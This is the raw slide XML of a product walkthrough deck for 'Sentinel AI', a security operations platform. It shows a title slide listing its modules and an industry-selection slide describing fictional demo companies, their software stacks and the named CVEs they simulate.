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0" y="822960"/>
            <a:ext cx="8229600" cy="5212080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D1424"/>
          </a:solidFill>
          <a:ln w="1016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822960"/>
            <a:ext cx="8229600"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1051560"/>
            <a:ext cx="8229600" cy="1097280"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="6000" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>SENTINEL AI</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="TextBox 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2011680" y="2240280"/>
            <a:ext cx="8229600" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="1700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>AI-Powered Security Operations Platform</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Rectangle 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3657600" y="2743200"/>
            <a:ext cx="4937760" cy="27432"/>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0" y="2852928"/>
            <a:ext cx="8229600" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="900" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>FRONTEND WALKTHROUGH  ·  FEATURE GUIDE  ·  LIVE DEMO</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="TextBox 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2011680" y="3200400"/>
            <a:ext cx="8229600" cy="347472"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="1400" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Industry: GlobalShip Logistics</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2011680" y="3611880"/>
            <a:ext cx="8229600" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="900" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Fleet management · Supply chain ERP · IoT warehouse · Real CVEs · Live exploit simulation</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3657600" y="3977639"/>
            <a:ext cx="4937760" cy="27432"/>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4114800"/>
            <a:ext cx="8229600" cy="237744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="900" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="4A5E78"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Dashboard  ·  Asset Inventory  ·  Risk Management  ·  Vulnerabilities</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="TextBox 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2011680" y="4370832"/>
            <a:ext cx="8229600" cy="237744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="900" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="4A5E78"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Exploit Lab  ·  Logistics Lab  ·  Red Team  ·  Attack Graph  ·  Phishing</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="TextBox 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2011680" y="4626864"/>
            <a:ext cx="8229600" cy="237744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="900" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="4A5E78"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Patch Automation  ·  Threat Intelligence  ·  Dark Web  ·  Incidents</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="TextBox 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2011680" y="4882896"/>
            <a:ext cx="8229600" cy="237744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="900" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="4A5E78"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Compliance  ·  Reports  ·  Infrastructure  ·  DevSecOps  ·  Cloud Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="TextBox 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2011680" y="5230368"/>
            <a:ext cx="8229600" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="800" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>March 2026  ·  18 Slides  ·  30+ Modules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Industry Selection</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The first screen you see — choose your demo environment to load a fully seeded, industry-specific dataset</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When Sentinel AI loads for the first time, you are presented with four industry options. Each industry represents a different fictional company, complete with realistic assets, IP ranges, known CVEs for that sector's technology stack, pre-run exploit simulations, compliance controls, incident history, and dark web findings. Selecting an industry bootstraps the entire platform with coherent, contextually accurate data — so every page tells a consistent story. You can switch industries at any time using the logout button in the sidebar footer.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Rectangle 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="1847088"/>
            <a:ext cx="2880360" cy="4370832"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111722"/>
          </a:solidFill>
          <a:ln w="1524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1847088"/>
            <a:ext cx="2880360" cy="64008"/>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938528"/>
            <a:ext cx="2880360" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="2800" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>🚢</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="TextBox 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="2514600"/>
            <a:ext cx="2880360" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>GlobalShip
Logistics</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="TextBox 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="338328" y="3090672"/>
            <a:ext cx="2660904" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ERPNext · Redis · Kafka</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="TextBox 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="338328" y="3291840"/>
            <a:ext cx="2660904" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Grafana · PostgreSQL</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="TextBox 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="338328" y="3493008"/>
            <a:ext cx="2660904" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Prometheus · GitLab</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Rectangle 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="338328" y="3730752"/>
            <a:ext cx="266090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813048"/>
            <a:ext cx="2660904" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="800" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸  Fleet management &amp; supply chain ERP</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="TextBox 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="4050792"/>
            <a:ext cx="2660904" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="800" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸  IoT warehouse gateway devices</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="TextBox 18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="4288536"/>
            <a:ext cx="2660904" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="800" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸  Real CVEs: Log4Shell, Redis RCE, Kafka PII</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="TextBox 19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="4526280"/>
            <a:ext cx="2660904" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="800" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸  6 Docker services with live exploits</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Rectangle 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="5870448"/>
            <a:ext cx="2880360" cy="347472"/>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5888736"/>
            <a:ext cx="2880360" cy="310896"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="900" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="0D1424"/>
                </a:solidFill>
              </a:rPr>
              <a:t>✓  ACTIVE IN THIS DEMO</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Rectangle 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3200400" y="1847088"/>
            <a:ext cx="2880360" cy="4370832"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111722"/>
          </a:solidFill>
          <a:ln w="635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938528"/>
            <a:ext cx="2880360" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="2800" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>💳</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="TextBox 24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3200400" y="2514600"/>
            <a:ext cx="2880360" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>NexaPay
Financial</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="TextBox 25"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3310128" y="3090672"/>
            <a:ext cx="2660904" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Fineract Banking</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="TextBox 26"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3310128" y="3291840"/>
            <a:ext cx="2660904" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Payment API · Vault</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="TextBox 27"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3310128" y="3493008"/>
            <a:ext cx="2660904" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Fraud Detection · Redis</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Rectangle 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3310128" y="3730752"/>
            <a:ext cx="266090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813048"/>
            <a:ext cx="2660904" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="800" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸  Core banking &amp; payment processing</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="TextBox 30"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3337560" y="4050792"/>
            <a:ext cx="2660904" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="800" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸  Fraud detection ML pipeline</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="TextBox 31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3337560" y="4288536"/>
            <a:ext cx="2660904" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="800" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸  PCI-DSS &amp; SOX compliance focus</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="TextBox 32"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3337560" y="4526280"/>
            <a:ext cx="2660904" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="800" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸  HSM &amp; secrets management stack</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="Rectangle 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="1847088"/>
            <a:ext cx="2880360" cy="4370832"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111722"/>
          </a:solidFill>
          <a:ln w="635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72200" y="1938528"/>
            <a:ext cx="2880360" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="2800" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>🛒</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36" name="TextBox 35"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="2514600"/>
            <a:ext cx="2880360" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ShopVault
Commerce</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="37" name="TextBox 36"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6281928" y="3090672"/>
            <a:ext cx="2660904" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Storefront · Elasticsearch</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="TextBox 37"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6281928" y="3291840"/>
            <a:ext cx="2660904" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
